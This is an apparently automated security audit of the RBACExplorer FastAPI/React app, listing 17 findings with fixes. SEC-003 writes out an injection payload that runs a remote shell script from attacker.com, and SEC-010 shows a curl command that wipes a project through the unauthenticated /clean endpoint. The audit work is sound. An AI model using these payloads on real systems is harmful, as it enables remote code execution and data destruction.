# RBACExplorer — Security Audit Report

**Date:** 2026-04-25
**Auditor:** GSD Security Auditor (automated)
**Scope:** Full-stack FastAPI + React application at `/Users/aishitdua/Code/RBACExplorer`
**ASVS Reference Level:** ASVS L2 (internal tooling with sensitive policy data)

---

## Overall Risk Summary

The application manages RBAC policy definitions — it does not enforce access control itself, but it is the source of truth for who can do what in a downstream system. A compromise of this tool can silently rewrite production RBAC policy. The most critical finding is the complete absence of authentication and authorization: any network-reachable attacker can read, create, or destroy all policy data. Several secondary issues compound this exposure (wildcard CORS, code-generation injection, unbounded DoS surface, cross-project permission assignment). All critical and high findings should be resolved before the service is exposed to any network beyond localhost.

---

## Findings

### CRITICAL

---

#### SEC-001 — No Authentication or Authorization on Any Endpoint

**Severity:** Critical
**OWASP:** A01:2021 – Broken Access Control

**Affected files:**

- `backend/app/main.py` (all routers registered with no auth middleware)
- `backend/app/routers/*.py` (every route handler)

**Description:**
Every API endpoint — including destructive ones like `DELETE /api/v1/projects/{slug}`, `POST /api/v1/projects/{slug}/clean`, and all import/export endpoints — is publicly accessible with no token, session, or API-key check of any kind. There is no `Depends(get_current_user)` guard anywhere in the codebase.

**Exploitation scenario:**
Any user who can reach the service (including any browser tab via the wildcard CORS policy) can enumerate all projects, read all RBAC policy definitions, delete any project, import arbitrary roles/permissions, or export generated Python code. In a production deployment on Render (render.yaml), the service is internet-reachable by default.

**Recommended fix:**
Add an authentication middleware or a FastAPI dependency injected at router registration time. At minimum, use a shared secret / API key checked in a `Security` dependency on every router. For multi-user scenarios, implement JWT or OAuth2 with scoped claims. Add this before any non-localhost deployment.

```python
# Example: per-router API key guard
from fastapi.security import APIKeyHeader
api_key_header = APIKeyHeader(name="X-API-Key")

async def verify_api_key(key: str = Security(api_key_header)):
    if key != settings.api_key:
        raise HTTPException(403, "Forbidden")

app.include_router(projects.router, prefix="/api/v1",
                   dependencies=[Depends(verify_api_key)])
```

---

#### SEC-002 — Cross-Project Permission/Resource Assignment (Broken Object-Level Authorization)

**Severity:** Critical
**OWASP:** A01:2021 – Broken Access Control (BOLA / IDOR)

**Affected files:**

- `backend/app/routers/permissions.py` lines 100–112 (`assign_permission`)
- `backend/app/routers/permissions.py` lines 131–143 (`map_resource`)

**Description:**
`POST /api/v1/projects/{slug}/roles/{role_id}/permissions/{perm_id}` and `POST /api/v1/projects/{slug}/permissions/{perm_id}/resources/{res_id}` accept `role_id`, `perm_id`, and `res_id` as path parameters but **never validate that these IDs belong to the project identified by `{slug}`**. The `slug` is fetched and validated at the top of other handlers (e.g., `_get_project`) but these two endpoints skip that check entirely and use the raw UUIDs directly.

**Exploitation scenario:**
An attacker creates Project A and Project B. They then call:

```
POST /api/v1/projects/project-a/roles/<role_id_from_project_b>/permissions/<perm_id_from_project_b>
```

This silently links a role from Project B to a permission from Project B, bypassing any intended project isolation. With no auth layer, a non-owner can do this across any two projects.

**Recommended fix:**
In both `assign_permission` and `map_resource` (and their `DELETE` counterparts), resolve the project from `slug` first, then verify that both the role and permission (or resource) belong to `project.id` before creating the link. Follow the pattern used correctly in `roles.py` (`get_role_or_404` which checks `Role.project_id == project_id`).

---

### HIGH

---

#### SEC-003 — Code Generation Injection via `row.path` in FastAPI Export

**Severity:** High
**OWASP:** A03:2021 – Injection (Code Generation / Template Injection)

**Affected files:**

- `backend/app/routers/export.py` lines 68–73

**Description:**
The `/export/fastapi` endpoint generates Python source code and embeds `row.path` directly into an f-string decorator without sanitization:

```python
f'@router.{method}("{row.path}")',
```

Only the `permission_name` field has an escape applied (`replace('"', '\\"')`). The `row.path` value — stored verbatim from user input — is placed inside a Python string literal in generated code. A path value containing `")\n<arbitrary_code>\n@router.get("` would break out of the decorator string and inject arbitrary Python statements into the exported file.

**Exploitation scenario:**

1. Attacker creates a resource with path: `"\ndef backdoor(): os.system('curl attacker.com/shell | bash')\n@router.get("`
2. Developer copies the exported code and runs it in production.
3. The injected function executes on import.

Even without malicious intent, paths containing backslashes, triple-quotes, or newlines will produce syntactically broken output that confuses developers.

**Recommended fix:**
Apply the same escaping to `row.path` as is applied to `safe_perm`. Additionally, validate at resource-creation time that `path` matches a URL path pattern (`^/[a-zA-Z0-9/_{}.-]*$`) in the Pydantic schema, so the problem is prevented at ingestion rather than fixed at output time. Also apply escaping to `method` (though this is currently constrained by the `lower()` call and SQL filtering).

---

#### SEC-004 — Wildcard CORS (`allow_origins=["*"]`) in Production

**Severity:** High
**OWASP:** A05:2021 – Security Misconfiguration

**Affected files:**

- `backend/app/main.py` lines 17–22

**Description:**
The CORS policy allows requests from any origin with any method and any header:

```python
CORSMiddleware(allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])
```

This is acceptable for localhost development, but the same configuration is deployed to production (render.yaml has no override). This means any website on the internet can make cross-origin requests to the API and read the JSON responses in the victim's browser (assuming the victim has network access to the API).

**Exploitation scenario:**
A malicious website embeds JavaScript that calls the RBACExplorer API from the victim's browser, reads all RBAC policy data, and exfiltrates it. With state-changing endpoints (DELETE, POST) also covered, the same script can destroy projects or inject roles.

**Recommended fix:**
Restrict `allow_origins` to the explicit list of frontend origins (e.g., `["https://app.yourcompany.com"]`). Use an environment variable so dev keeps `["*"]` locally while production uses the restricted list. Remove `allow_methods=["*"]` and enumerate only `GET`, `POST`, `PATCH`, `DELETE`.

```python
allow_origins=settings.cors_origins.split(",")
```

---

#### SEC-005 — No Rate Limiting — Full DoS / Resource Exhaustion Surface

**Severity:** High
**OWASP:** A04:2021 – Insecure Design

**Affected files:**

- `backend/app/main.py` (no rate-limit middleware)
- `backend/app/routers/analyze.py` (recursive CTE queries)
- `backend/app/routers/simulate.py` (recursive CTE queries)

**Description:**
There is no rate limiting on any endpoint. The analyze and simulate endpoints each execute multiple recursive CTE queries that traverse the entire role-inheritance graph. An attacker (or a misbehaving client) can flood these endpoints to exhaust database connections and CPU.

Additionally, the `POST /import/openapi` endpoint accepts an arbitrary JSON body with a `paths` key. While there is a `len(paths) > 500` check, a single request with 500 deeply nested path objects still results in 500 sequential `SELECT` + optional `INSERT` pairs within a single request — up to 1000 DB round-trips per call.

**Recommended fix:**

- Add `slowapi` or a reverse-proxy-level rate limiter (nginx, Cloudflare).
- Add query timeouts to the database engine: `create_async_engine(url, connect_args={"command_timeout": 10})`.
- Add a per-project ceiling on the number of roles/permissions/resources (e.g., max 200 each) enforced in the write endpoints, so CTE traversal is bounded.

---

#### SEC-006 — YAML Import Exposes Internal Exception Details

**Severity:** High
**OWASP:** A09:2021 – Security Logging and Monitoring Failures / A05 – Security Misconfiguration

**Affected files:**

- `backend/app/routers/import_.py` lines 350–354

**Description:**
The YAML import endpoint catches all exceptions and returns the raw exception string to the client:

```python
except Exception as e:
    await session.rollback()
    raise HTTPException(status_code=500, detail=f"Import Error: {str(e)}") from None
```

Python exception messages from SQLAlchemy, asyncpg, or the yaml parser can contain database DSN fragments, internal table names, column names, and full stack-trace information. For asyncpg in particular, connection errors include the full `DATABASE_URL`.

**Exploitation scenario:**
An attacker submits a malformed YAML file that triggers a DB constraint violation. The `500` response body contains `asyncpg.exceptions.UniqueViolationError: duplicate key value violates unique constraint "uq_roles_project_id_name" DETAIL: Key (project_id, name)=(uuid, rolename) already exists.` — revealing schema details. A network error would expose the Neon Postgres DSN.

**Recommended fix:**
Log the full exception server-side (`logger.exception("YAML import failed")`), then return a generic `500` message to the client: `"detail": "Import failed. Check your YAML structure and try again."` Never include `str(e)` from a caught exception in HTTP responses.

---

### MEDIUM

---

#### SEC-007 — No Input Length/Format Validation on Schemas

**Severity:** Medium
**OWASP:** A03:2021 – Injection

**Affected files:**

- `backend/app/schemas.py` (all schema classes)
- `backend/app/models.py` (String columns without length enforcement beyond DB level)

**Description:**
Pydantic schemas accept unbounded strings for `name`, `description`, `path`, `slug`, and `color`. Only the `color` field has a DB-level length (`String(7)`) and only `slug` has a DB-level max (`String(128)`). There is no Pydantic-level `max_length`, `min_length`, or `pattern` constraint on any field.

**Specific gaps:**

| Field                     | Schema | Issue                        |
| ------------------------- | ------ | ---------------------------- | -------------------- |
| `name` (Role, Permission) | `str`  | Unbounded; can be 1 MB       |
| `path` (Resource)         | `str`  | No URL format check          |
| `method` (Resource)       | `str`  | No enum enforcement          |
| `color` (Role)            | `str`  | No `#[0-9a-fA-F]{6}` pattern |
| `slug` (Project)          | `str   | None`                        | No format constraint |

A 10 MB `name` field will be accepted, stored, and then included in every list response, multiplied across all API clients.

**Recommended fix:**
Add Pydantic v2 field constraints:

```python
from pydantic import Field
import re

class RoleCreate(BaseModel):
    name: str = Field(min_length=1, max_length=128)
    description: str = Field(default="", max_length=1024)
    color: str = Field(default="#60a5fa", pattern=r"^#[0-9a-fA-F]{6}$")

class ResourceCreate(BaseModel):
    method: Literal["GET", "POST", "PUT", "PATCH", "DELETE"]
    path: str = Field(min_length=1, max_length=512, pattern=r"^/[a-zA-Z0-9/_{}.\-]*$")
    description: str = Field(default="", max_length=1024)
```

---

#### SEC-008 — CSV/YAML File Upload: No MIME Type or Extension Enforcement

**Severity:** Medium
**OWASP:** A04:2021 – Insecure Design

**Affected files:**

- `backend/app/routers/import_.py` lines 71–122 (`import_csv`)
- `backend/app/routers/import_.py` lines 125–354 (`import_yaml`)

**Description:**
The `validate_file_size` function checks `file.size`, but `file.size` is derived from the `Content-Length` header which is client-controlled and can be spoofed (or omitted, making `file.size` be `None`, which bypasses the check entirely). There is also no check on `file.content_type` or the file extension — an attacker can upload any file under any name.

```python
async def validate_file_size(file: UploadFile):
    if file.size and file.size > MAX_FILE_SIZE:  # None check is bypassed if size is None
        ...
```

The actual byte-level read (`await file.read()`) reads the full upload regardless. If a client omits `Content-Length`, `file.size` is `None` and the check is silently skipped.

**Recommended fix:**
Read the file in chunks with a hard ceiling on total bytes consumed, rather than relying on the header:

```python
MAX_FILE_SIZE = 2 * 1024 * 1024

async def read_with_limit(file: UploadFile) -> bytes:
    data = b""
    async for chunk in file:
        data += chunk
        if len(data) > MAX_FILE_SIZE:
            raise HTTPException(413, "File too large")
    return data
```

Also validate `file.content_type` against an allowlist (`text/csv`, `text/yaml`, `application/x-yaml`).

---

#### SEC-009 — Cross-Site Request Forgery (CSRF) on State-Changing Operations

**Severity:** Medium
**OWASP:** A01:2021 – Broken Access Control

**Affected files:**

- `backend/app/main.py` (no CSRF protection)
- All `POST`, `PATCH`, `DELETE` handlers

**Description:**
The application has no CSRF protection. Combined with `allow_origins=["*"]` and no authentication tokens checked in headers (no bearer token requirement), the POST/DELETE endpoints are fully vulnerable to cross-site request forgery from any page the user visits. Browser pre-flight OPTIONS will succeed for any origin, and simple form `POST` requests won't even trigger a pre-flight.

**Note:** Once proper authentication (SEC-001) is implemented with header-based tokens (Authorization: Bearer ...), CSRF risk is substantially reduced because cookies are not used. However, the current no-auth state means this is exploitable today.

**Recommended fix:**
Implement header-based authentication (bearer token). Do not use cookie-based sessions without a CSRF token. When auth is in place, ensure all state-changing operations require a header that a cross-site form cannot set (e.g., `Authorization`, `X-API-Key`).

---

#### SEC-010 — `POST /projects/{slug}/clean` is an Unauthenticated Destructive Wipe Endpoint

**Severity:** Medium (compound with SEC-001 becomes Critical)
**OWASP:** A01:2021 – Broken Access Control

**Affected files:**

- `backend/app/routers/projects.py` lines 51–65

**Description:**
`POST /api/v1/projects/{slug}/clean` deletes all roles, permissions, and resources for a project in a single unauthenticated call. While the frontend shows a confirmation dialog, the API itself has no safeguard. Any direct HTTP client can call this without a browser, bypassing the UI confirmation entirely.

**Exploitation scenario:**

```bash
curl -X POST https://your-render-deployment.onrender.com/api/v1/projects/production-config/clean
```

This wipes the entire RBAC configuration of a production project silently.

**Recommended fix:**
Beyond adding authentication (SEC-001), consider requiring the project `slug` to be re-confirmed in the request body (a common pattern for destructive operations), and add an audit log entry before executing the wipe.

---

#### SEC-011 — `add_permissions` / `remove_permissions` Query Params Accept Unvalidated UUIDs in Diff Endpoint

**Severity:** Medium
**OWASP:** A03:2021 – Injection

**Affected files:**

- `backend/app/routers/analyze.py` lines 97–183 (`diff_role`)

**Description:**
The `diff` endpoint accepts `add_permissions` and `remove_permissions` as lists of strings via query parameters. These are passed directly into a SQLAlchemy `IN` clause:

```python
PermissionResource.permission_id.in_(list(effective_perm_ids))
```

While SQLAlchemy ORM `IN` clauses use parameterized binding and are not injectable, there is no validation that these UUIDs belong to the project identified by `{slug}`. An attacker can pass permission IDs from a different project to simulate cross-project what-if scenarios, potentially leaking which resources are accessible under foreign permissions.

**Recommended fix:**
Validate that all supplied `add_permissions` and `remove_permissions` IDs belong to `project.id` before using them in the diff computation.

---

#### SEC-012 — Export Endpoint Embeds `row.path` Without Path Sanitization in Decorator

**Severity:** Medium (see also SEC-003 for the critical injection variant)
**OWASP:** A03:2021 – Injection

**Affected files:**

- `backend/app/routers/export.py` lines 53–73

**Description:**
Even if outright code injection via `row.path` is not achieved, path strings containing non-ASCII characters, backslashes, or percent-encoded sequences will produce malformed Python decorator strings. The `safe_path` sanitization used for the function name (strip, replace) is applied to produce a valid Python identifier but the **original unsanitized `row.path`** is used in the decorator string. These are two separate variables.

**Recommended fix:**
Use `repr()` or explicit escaping for `row.path` when embedding it in the decorator string:

```python
safe_decorator_path = row.path.replace("\\", "\\\\").replace('"', '\\"')
f'@router.{method}("{safe_decorator_path}")'
```

---

### LOW

---

#### SEC-013 — Frontend `.env` File Tracked by Git Status (Not Ignored in Practice)

**Severity:** Low
**OWASP:** A02:2021 – Cryptographic Failures / Secrets Exposure

**Affected files:**

- `frontend/.env` (present on disk, contains `VITE_API_URL`)
- `backend/.env` (present on disk, contains `DATABASE_URL`)
- `.gitignore` (correctly lists both, but `git status` shows them as modified — they exist in the working tree and were previously tracked)

**Description:**
Both `.env` files appear in `git status` as modified (`M`), meaning they were committed to git history at some point. Running `git log --all -- backend/.env` will reveal if the Neon Postgres DSN (with credentials) was ever committed. Even `VITE_API_URL` leaking the production API hostname is an information disclosure.

**Recommended fix:**

1. Run `git log --all --follow -- backend/.env` to check history.
2. If a DSN with credentials was committed, rotate the Neon Postgres password immediately.
3. Use `git filter-repo` or BFG Repo Cleaner to remove the files from history.
4. Add `.env` files to `.gitignore` with a pre-commit hook that blocks future commits of `.env` files containing secrets.

---

#### SEC-014 — No Security Headers (CSP, X-Content-Type-Options, etc.)

**Severity:** Low
**OWASP:** A05:2021 – Security Misconfiguration

**Affected files:**

- `backend/app/main.py`

**Description:**
The FastAPI application returns no security headers. Missing headers include:

- `Content-Security-Policy`
- `X-Content-Type-Options: nosniff`
- `X-Frame-Options: DENY`
- `Referrer-Policy: no-referrer`
- `Strict-Transport-Security` (for HTTPS deployments)

**Recommended fix:**
Add a response middleware or use `secure` library:

```python
from starlette.middleware.base import BaseHTTPMiddleware

class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request, call_next):
        response = await call_next(request)
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["X-Frame-Options"] = "DENY"
        response.headers["Referrer-Policy"] = "no-referrer"
        return response
```

---

#### SEC-015 — Frontend Leaks Specific API Error Messages to Users

**Severity:** Low
**OWASP:** A09:2021 – Security Logging and Monitoring Failures

**Affected files:**

- `frontend/src/tabs/ImportTab.jsx` line 24 (`err.response?.data?.detail`)
- `frontend/src/tabs/GraphTab.jsx` line 257 (`err.response?.data?.detail`)

**Description:**
Backend error `detail` strings are surfaced directly in the frontend UI without filtering. As noted in SEC-006, these details can contain internal schema information. Even for low-severity errors, showing `"Role name already exists in this project"` with a project UUID teaches an attacker the system's data model.

**Recommended fix:**
Map known error codes to user-friendly messages on the frontend. Pass `HTTP status code` through rather than raw `detail` strings for anything except validation errors (422).

---

#### SEC-016 — `file.size` Header Trust in Upload Validation

**Severity:** Low (subset of SEC-008, called out separately for clarity)
**OWASP:** A04:2021 – Insecure Design

**Affected files:**

- `backend/app/routers/import_.py` lines 26–30

**Description:**
`file.size` in FastAPI/Starlette is sourced from the `Content-Length` HTTP header, which is controlled by the client. A client can claim a small size while sending a large body, or omit the header entirely. Since the check is `if file.size and file.size > MAX_FILE_SIZE`, omitting the header results in `file.size = None` and the entire size check is skipped.

See SEC-008 for the recommended fix (streaming byte-count approach).

---

#### SEC-017 — No Audit Logging for Destructive or Security-Relevant Operations

**Severity:** Low
**OWASP:** A09:2021 – Security Logging and Monitoring Failures

**Affected files:**

- All routers (no logging calls present)

**Description:**
There is no structured audit logging for any operation in the application. Deleting a project, importing a YAML file that modifies hundreds of roles, or calling `/clean` leaves no trace in any log. If the system is later used in a production context, forensic investigation of unauthorized changes will be impossible.

**Recommended fix:**
Add structured logging (e.g., using Python's `logging` module or `structlog`) for all mutating operations, including: who called it (IP at minimum), what entity was affected, and the outcome. Log at `INFO` level for normal operations and `WARNING` for validation failures.

---

## Findings Summary Table

| ID      | Severity     | Category                  | Title                                                          |
| ------- | ------------ | ------------------------- | -------------------------------------------------------------- |
| SEC-001 | **Critical** | Authentication            | No authentication or authorization on any endpoint             |
| SEC-002 | **Critical** | Authorization / IDOR      | Cross-project permission/resource assignment                   |
| SEC-003 | **High**     | Code Injection            | Code generation injection via unsanitized `row.path`           |
| SEC-004 | **High**     | Security Misconfiguration | Wildcard CORS in production                                    |
| SEC-005 | **High**     | DoS / Resource Exhaustion | No rate limiting on expensive recursive queries                |
| SEC-006 | **High**     | Information Disclosure    | Raw exception details returned in HTTP 500 responses           |
| SEC-007 | **Medium**   | Input Validation          | No field length or format constraints in Pydantic schemas      |
| SEC-008 | **Medium**   | Input Validation          | File upload: `Content-Length` header trust, no MIME check      |
| SEC-009 | **Medium**   | CSRF                      | No CSRF protection on state-changing endpoints                 |
| SEC-010 | **Medium**   | Authorization             | Unauthenticated destructive `/clean` endpoint                  |
| SEC-011 | **Medium**   | Authorization             | Diff endpoint accepts unvalidated cross-project permission IDs |
| SEC-012 | **Medium**   | Code Injection            | Export embeds unsanitized `row.path` in decorator string       |
| SEC-013 | **Low**      | Secrets                   | `.env` files potentially committed to git history              |
| SEC-014 | **Low**      | Security Misconfiguration | Missing HTTP security headers                                  |
| SEC-015 | **Low**      | Information Disclosure    | Frontend surfaces raw backend error detail strings             |
| SEC-016 | **Low**      | Input Validation          | `file.size` header trust in upload size check                  |
| SEC-017 | **Low**      | Audit                     | No audit logging for destructive or mutating operations        |

---

## Accepted Risks Log

The following risks are accepted at this time given the current development stage:

| Risk                        | Rationale                                                                                                                         |
| --------------------------- | --------------------------------------------------------------------------------------------------------------------------------- |
| No authentication (SEC-001) | Authentication layer is explicitly in-progress per project description. **Must be resolved before any non-localhost deployment.** |
| No rate limiting (SEC-005)  | Application is currently localhost-only. Must be addressed before production deployment.                                          |

---

## Recommended Remediation Priority

**Immediate (before any production / non-localhost deployment):**

1. SEC-001 — Add authentication (API key or JWT bearer token)
2. SEC-002 — Add project ownership checks to `assign_permission` and `map_resource`
3. SEC-004 — Restrict CORS to explicit origin allowlist
4. SEC-013 — Audit git history for committed secrets; rotate credentials if found

**Short-term (next sprint):** 5. SEC-003 / SEC-012 — Sanitize `row.path` in code export generator 6. SEC-006 — Replace raw exception exposure with generic 500 messages 7. SEC-007 — Add Pydantic field constraints (length, pattern, enum) 8. SEC-008 / SEC-016 — Fix file upload size enforcement (streaming read) 9. SEC-010 — Add safeguard on `/clean` endpoint beyond UI confirmation

**Medium-term:** 10. SEC-005 — Add rate limiting (slowapi or reverse proxy) 11. SEC-009 — Ensure auth scheme is header-based (not cookie-based) to mitigate CSRF 12. SEC-011 — Validate diff endpoint permission IDs belong to project 13. SEC-014 — Add security headers middleware 14. SEC-017 — Add structured audit logging 15. SEC-015 — Map backend errors to user-friendly messages on frontend
